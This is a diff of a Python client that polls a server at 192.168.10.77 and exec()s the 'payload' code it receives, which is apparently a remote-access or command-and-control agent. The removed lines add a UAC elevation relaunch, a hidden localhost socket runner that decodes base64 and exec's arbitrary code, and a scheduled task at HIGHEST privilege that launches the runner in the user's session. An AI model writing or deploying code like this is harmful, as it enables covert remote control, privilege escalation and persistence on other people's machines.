@@ -3,12 +3,8 @@ import threading
 from socket import gethostname, gethostbyname
 from uuid import getnode
 from time import sleep
-import subprocess
 import requests
 import sys
-import ctypes
-import base64
-import socket
 
 SERVER_URL = "http://192.168.10.77:8000"
 WS_URL = "ws://192.168.10.77:8000/ws"
@@ -34,94 +30,13 @@ headers = {
 }
 header_lock = threading.Lock()
 PYTHON_EXE = sys.executable
-# runner
-TASK_NAME = "InteractiveRunnerTask"
-RUNNER_PORT = 5050
-RUNNER_FILENAME = "runner_interactive.py"
-RUNNER_CODE = f"""import socket, base64, threading
-
-HOST='127.0.0.1'
-PORT={RUNNER_PORT}
-
-def handle_client(conn):
-    try:
-        data = conn.recv(10_000_000)
-        code = base64.b64decode(data)
-        exec(code, globals())
-    except Exception as e:
-        print('Runner error:', e)
-    finally:
-        conn.close()
-
-s=socket.socket()
-s.bind((HOST, PORT))
-s.listen(5)
-print(f'Runner listening on {{HOST}}:{{PORT}}')
-while True:
-    conn,_=s.accept()
-    threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
-"""
-
-def elevate():
-    """Re-launch the current script with UAC elevation if not already admin."""
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        return  # Already elevated, nothing to do
-
-    ctypes.windll.shell32.ShellExecuteW(
-        None,
-        "runas",
-        sys.executable,
-        " ".join(f'"{arg}"' for arg in sys.argv),
-        None,
-        1
-    )
-    sys.exit()
-
-def write_runner_file():
-    runner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), RUNNER_FILENAME)
-    with open(runner_path, "w", encoding="utf-8") as f:
-        f.write(RUNNER_CODE)
-    return runner_path
-
-def create_runner_task(runner_path):
-    python_path = sys.executable
-    cmd = f'"{python_path}" "{runner_path}"'
-    subprocess.run([
-        "schtasks",
-        "/create",
-        "/tn", TASK_NAME,
-        "/tr", cmd,
-        "/sc", "ONCE",
-        "/st", "00:00",   # dummy time; we will run manually
-        "/rl", "HIGHEST",
-        "/it",            # interactive GUI session
-        "/f"
-    ], check=True)
-
-def run_runner_task():
-    subprocess.run(["schtasks", "/run", "/tn", TASK_NAME], check=True)
-
-
-def delete_runner_task():
-    subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def launch_python_in_user_session(code: str, host="127.0.0.1", port=RUNNER_PORT):
-    encoded = base64.b64encode(code.encode())
-    s = socket.socket()
-    s.connect((host, port))
-    s.sendall(encoded)
-    s.close()
 
 def run_payload_code(code: str):
     exec(code, globals())
 
 def execute_payload(payload_code, payload_id, launch_as_user):
     try:
-        if launch_as_user:
-            launch_python_in_user_session(payload_code)
-        else:
-            run_payload_code(payload_code)
+        run_payload_code(payload_code)
         payload_status, err = "success", ""
     except Exception as e:
         print(f"Payload {payload_id} error:", e)
@@ -172,12 +87,4 @@ def poll_server():
         sleep(0.5)
 
 if __name__ == "__main__":
-    elevate()
-    runner_path = write_runner_file()
-    try:
-        create_runner_task(runner_path)
-    except subprocess.CalledProcessError:
-        pass # task already exists
-    run_runner_task()
-    sleep(3)
     poll_server()
